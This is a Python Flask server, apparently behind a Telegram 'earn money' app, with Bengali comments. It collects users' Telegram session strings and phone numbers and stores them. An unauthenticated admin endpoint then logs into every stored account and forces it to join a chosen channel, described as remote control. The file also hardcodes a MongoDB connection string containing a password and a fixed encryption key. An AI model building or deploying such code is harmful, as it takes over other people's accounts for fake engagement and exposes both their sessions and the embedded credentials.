import os
import base64
import asyncio
from flask import Flask, request, jsonify
from flask_cors import CORS
from pymongo import MongoClient
from telethon import TelegramClient, functions
from telethon.sessions import StringSession
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

app = Flask(__name__)
CORS(app)

# --- কনফিগারেশন (আপনার ডাটা) ---
API_ID = 'YOUR_API_ID'      # আপনার API ID দিন
API_HASH = 'YOUR_API_HASH'  # আপনার API HASH দিন
MONGO_URI = "mongodb+srv://Asfak1:Abdullah6790@cluster0.ykmq2wh.mongodb.net/?retryWrites=true&w=majority"
SECRET_KEY = b'AAF_STRONG_APP_SECURE_32_BIT_KEY' # সেশন সুরক্ষিত রাখার কি

client_db = MongoClient(MONGO_URI)
db = client_db['AAF_TeleEarn']
users_col = db['users']
sessions_col = db['sessions'] # সেশনগুলো এখানে জমা হবে

# --- এনক্রিপশন লজিক (সেশন নিরাপদ রাখতে) ---
def encrypt_session(session_str):
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(session_str.encode(), AES.block_size))
    iv = base64.b64encode(cipher.iv).decode('utf-8')
    ct = base64.b64encode(ct_bytes).decode('utf-8')
    return f"{iv}:{ct}"

def decrypt_session(encrypted_str):
    iv_b64, ct_b64 = encrypted_str.split(':')
    iv = base64.b64decode(iv_b64)
    ct = base64.b64decode(ct_b64)
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ct), AES.block_size).decode('utf-8')

# --- ১. সেশন সেভ করা (ইউজার যখন অ্যাকাউন্ট অ্যাড করবে) ---
@app.route('/api/add_account', methods=['POST'])
def add_account():
    data = request.json
    uid = data.get('telegram_id')
    raw_session = data.get('session_string') # টেলিগ্রাম থেকে পাওয়া সেশন
    phone = data.get('phone')

    encrypted = encrypt_session(raw_session)
    
    sessions_col.update_one(
        {"phone": phone},
        {"$set": {"telegram_id": int(uid), "session": encrypted, "status": "Active"}},
        upsert=True
    )
    users_col.update_one({"telegram_id": int(uid)}, {"$inc": {"added_accounts": 1}})
    
    return jsonify({"status": "success", "message": "Account linked to server!"})

# --- ২. অ্যাডমিন কন্ট্রোল লজিক (রিমোট কন্ট্রোল) ---
@app.route('/api/admin/force_join', methods=['POST'])
async def force_join():
    # এই এপিআই কল করলে আপনার সার্ভারে থাকা সব অ্যাকাউন্ট অটো চ্যানেলে জয়েন করবে
    data = request.json
    channel_to_join = data.get('channel') # যেমন: @aaf_tele_earn

    all_sessions = sessions_col.find({"status": "Active"})
    count = 0

    for sess in all_sessions:
        try:
            string_session = decrypt_session(sess['session'])
            async with TelegramClient(StringSession(string_session), API_ID, API_HASH) as client:
                await client(functions.channels.JoinChannelRequest(channel=channel_to_join))
                count += 1
        except Exception as e:
            print(f"Error controlling account {sess['phone']}: {e}")

    return jsonify({"status": "success", "joined_accounts": count})

# --- ৩. ড্যাশবোর্ড ডাটা (ব্যালেন্স সিঙ্ক) ---
@app.route('/api/user_data/<telegram_id>', methods=['GET'])
def get_user_data(telegram_id):
    user = users_col.find_one({"telegram_id": int(telegram_id)})
    if user:
        return jsonify({
            "status": "success",
            "name": user.get("name", "User"),
            "main_balance": user.get("main_balance", 0.0),
            "task_balance": user.get("task_balance", 0.0),
            "acc_status": user.get("status", "Inactive"),
            "added_accounts": user.get("added_accounts", 0)
        })
    return jsonify({"status": "error"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
